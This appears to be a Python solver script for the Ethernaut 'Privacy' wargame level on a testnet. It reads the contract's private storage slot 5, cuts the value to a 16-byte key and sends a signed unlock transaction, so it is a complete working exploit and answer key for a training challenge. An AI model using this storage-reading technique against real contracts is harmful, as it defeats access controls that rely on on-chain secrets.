#!/usr/bin/env python3
"""
Ethernaut Level 12: Privacy Validator
Objective: Unlock the contract by reading storage slot 5 (data[2])
Key Concept: Storage is readable even for "private" variables
"""

import os
import sys
from pathlib import Path
from dotenv import load_dotenv
from web3 import Web3

# Load environment
load_dotenv()

# Setup paths
EXPLOITS_DIR = Path(__file__).parent
sys.path.insert(0, str(EXPLOITS_DIR))

# Import local modules
try:
    from validate_template import EthernautValidator, COLORS, timestamp
except ImportError:
    # Fallback if template not available
    COLORS = {
        'GREEN': '\033[92m',
        'RED': '\033[91m',
        'YELLOW': '\033[93m',
        'BLUE': '\033[94m',
        'CYAN': '\033[96m',
        'RESET': '\033[0m'
    }
    def timestamp(): import time; return f"{time.strftime('%H:%M:%S')}"

# Privacy Contract ABI (minimal)
PRIVACY_ABI = [
    {
        "inputs": [],
        "name": "locked",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "bytes16", "name": "_key", "type": "bytes16"}],
        "name": "unlock",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

class PrivacyValidator:
    """Validator for Ethernaut Level 12: Privacy"""
    
    LEVEL = 12
    NAME = "Privacy"
    
    def __init__(self):
        rpc_url = os.getenv('SEPOLIA_RPC_URL') or os.getenv('RPC_URL')
        private_key = os.getenv('PRIVATE_KEY')
        
        if not rpc_url:
            raise ValueError("Missing SEPOLIA_RPC_URL or RPC_URL in environment")
        if not private_key:
            raise ValueError("Missing PRIVATE_KEY in environment")
        
        self.w3 = Web3(Web3.HTTPProvider(rpc_url))
        if not self.w3.is_connected():
            raise ConnectionError(f"Failed to connect to RPC: {rpc_url}")
        
        self.account = self.w3.eth.account.from_key(private_key)
        self.contract_address = os.getenv('PRIVACY_CONTRACT')
        
        if self.contract_address:
            self.contract = self.w3.eth.contract(
                address=Web3.to_checksum_address(self.contract_address),
                abi=PRIVACY_ABI
            )
        else:
            self.contract = None
        
        self.results = {
            'level': self.LEVEL,
            'name': self.NAME,
            'status': 'PENDING',
            'checks': [],
            'timestamp': timestamp()
        }
    
    def log(self, msg, color='RESET'):
        """Log with timestamp and color"""
        c = COLORS.get(color, COLORS['RESET'])
        r = COLORS['RESET']
        print(f"{c}[{timestamp()}] {msg}{r}")
    
    def check_rpc_connection(self):
        """Verify RPC connection"""
        self.log("üîå Checking RPC connection...", 'CYAN')
        if self.w3.is_connected():
            block = self.w3.eth.block_number
            self.log(f"   ‚úì Connected at block {block}", 'GREEN')
            self.results['checks'].append({'name': 'RPC Connection', 'status': 'PASS', 'block': block})
            return True
        else:
            self.log("   ‚úó RPC connection failed", 'RED')
            self.results['checks'].append({'name': 'RPC Connection', 'status': 'FAIL'})
            return False
    
    def check_contract_exists(self):
        """Verify contract is deployed"""
        self.log("üìã Checking contract deployment...", 'CYAN')
        
        if not self.contract_address:
            self.log("   ‚úó PRIVACY_CONTRACT not set in .env", 'RED')
            self.results['checks'].append({'name': 'Contract Deployment', 'status': 'FAIL', 'error': 'Address not set'})
            return False
        
        code = self.w3.eth.get_code(Web3.to_checksum_address(self.contract_address))
        if code and code != b'0x':
            self.log(f"   ‚úì Contract deployed at {self.contract_address}", 'GREEN')
            self.results['checks'].append({'name': 'Contract Deployment', 'status': 'PASS', 'address': self.contract_address})
            return True
        else:
            self.log("   ‚úó No contract at address", 'RED')
            self.results['checks'].append({'name': 'Contract Deployment', 'status': 'FAIL', 'error': 'No bytecode'})
            return False
    
    def check_initial_state(self):
        """Check that contract starts locked"""
        self.log("üîí Checking initial locked state...", 'CYAN')
        
        if not self.contract:
            self.log("   ‚ö† Contract not initialized", 'YELLOW')
            return False
        
        try:
            locked = self.contract.functions.locked().call()
            if locked:
                self.log("   ‚úì Contract is initially locked", 'GREEN')
                self.results['checks'].append({'name': 'Initial State', 'status': 'PASS', 'locked': True})
                return True
            else:
                self.log("   ‚ö† Contract already unlocked", 'YELLOW')
                self.results['checks'].append({'name': 'Initial State', 'status': 'WARN', 'locked': False})
                return True  # Still valid, just already solved
        except Exception as e:
            self.log(f"   ‚úó Error reading locked state: {e}", 'RED')
            return False
    
    def check_storage_read(self):
        """Read the key from storage slot 5 (data[2])"""
        self.log("üìñ Reading storage slot 5 (data[2])...", 'CYAN')
        
        try:
            # Slot 5 contains data[2] (bytes32)
            # Storage layout:
            # Slot 0: locked (1) + flattening (1) + denomination (1) + awkwardness (2) = packed
            # Slot 1: ID (uint256)
            # Slot 2: unused (packing remainder)
            # Slot 3: data[0]
            # Slot 4: data[1]
            # Slot 5: data[2] ‚Üê THE KEY
            
            raw_data = self.w3.eth.get_storage_at(
                Web3.to_checksum_address(self.contract_address),
                5  # Slot 5 = data[2]
            )
            
            self.log(f"   ‚úì Read storage slot 5: {raw_data.hex()}", 'GREEN')
            
            # Convert bytes32 to bytes16 (first 16 bytes)
            # bytes16 conversion keeps first 16 bytes, discards last 16
            key_bytes32 = raw_data
            key_bytes16 = key_bytes32[:16]  # First 16 bytes
            
            self.log(f"   ‚úì Extracted bytes16 key: 0x{key_bytes16.hex()}", 'GREEN')
            
            self.results['checks'].append({
                'name': 'Storage Read',
                'status': 'PASS',
                'slot': 5,
                'data32': raw_data.hex(),
                'key16': '0x' + key_bytes16.hex()
            })
            
            return key_bytes16
            
        except Exception as e:
            self.log(f"   ‚úó Error reading storage: {e}", 'RED')
            self.results['checks'].append({'name': 'Storage Read', 'status': 'FAIL', 'error': str(e)})
            return None
    
    def check_unlock(self, key):
        """Attempt to unlock with the extracted key"""
        self.log("üîì Attempting to unlock...", 'CYAN')
        
        if not key:
            self.log("   ‚úó No key provided", 'RED')
            return False
        
        try:
            # Build transaction
            tx = self.contract.functions.unlock(key).build_transaction({
                'from': self.account.address,
                'nonce': self.w3.eth.get_transaction_count(self.account.address),
                'gas': 100000,
                'gasPrice': self.w3.eth.gas_price
            })
            
            # Sign and send
            signed = self.w3.eth.account.sign_transaction(tx, self.account.key)
            tx_hash = self.w3.eth.send_raw_transaction(signed.rawTransaction)
            
            self.log(f"   ‚è≥ Transaction sent: {tx_hash.hex()[:20]}...", 'YELLOW')
            
            # Wait for receipt
            receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
            
            if receipt['status'] == 1:
                self.log("   ‚úì Unlock transaction succeeded", 'GREEN')
                self.results['checks'].append({
                    'name': 'Unlock Transaction',
                    'status': 'PASS',
                    'tx_hash': tx_hash.hex(),
                    'gas_used': receipt['gasUsed']
                })
                return True
            else:
                self.log("   ‚úó Transaction failed (reverted)", 'RED')
                self.results['checks'].append({'name': 'Unlock Transaction', 'status': 'FAIL', 'reverted': True})
                return False
                
        except Exception as e:
            self.log(f"   ‚úó Transaction error: {e}", 'RED')
            self.results['checks'].append({'name': 'Unlock Transaction', 'status': 'FAIL', 'error': str(e)})
            return False
    
    def check_final_state(self):
        """Verify contract is now unlocked"""
        self.log("üîç Verifying final state...", 'CYAN')
        
        try:
            locked = self.contract.functions.locked().call()
            
            if not locked:
                self.log("   ‚úì Contract is now UNLOCKED!", 'GREEN')
                self.results['checks'].append({'name': 'Final State', 'status': 'PASS', 'locked': False})
                return True
            else:
                self.log("   ‚úó Contract still locked", 'RED')
                self.results['checks'].append({'name': 'Final State', 'status': 'FAIL', 'locked': True})
                return False
                
        except Exception as e:
            self.log(f"   ‚úó Error verifying state: {e}", 'RED')
            return False
    
    def validate(self):
        """Run full validation"""
        print(f"\n{'='*60}")
        print(f"  Ethernaut Level {self.LEVEL}: {self.NAME}")
        print(f"{'='*60}\n")
        
        # Run checks
        if not self.check_rpc_connection():
            self.results['status'] = 'FAIL'
            return self.results
        
        if not self.check_contract_exists():
            self.results['status'] = 'FAIL'
            return self.results
        
        self.check_initial_state()
        
        # Extract key from storage
        key = self.check_storage_read()
        
        if key:
            # Attempt unlock
            if self.check_unlock(key):
                self.check_final_state()
                self.results['status'] = 'PASS'
            else:
                self.results['status'] = 'PARTIAL'
        else:
            self.results['status'] = 'FAIL'
        
        # Summary
        print(f"\n{'='*60}")
        status_color = 'GREEN' if self.results['status'] == 'PASS' else 'YELLOW' if self.results['status'] == 'PARTIAL' else 'RED'
        c = COLORS.get(status_color, COLORS['RESET'])
        r = COLORS['RESET']
        print(f"  Final Status: {c}{self.results['status']}{r}")
        print(f"{'='*60}\n")
        
        return self.results

def main():
    """Main entry point"""
    validator = PrivacyValidator()
    results = validator.validate()
    
    # Exit code based on status
    sys.exit(0 if results['status'] == 'PASS' else 1)

if __name__ == '__main__':
    main()
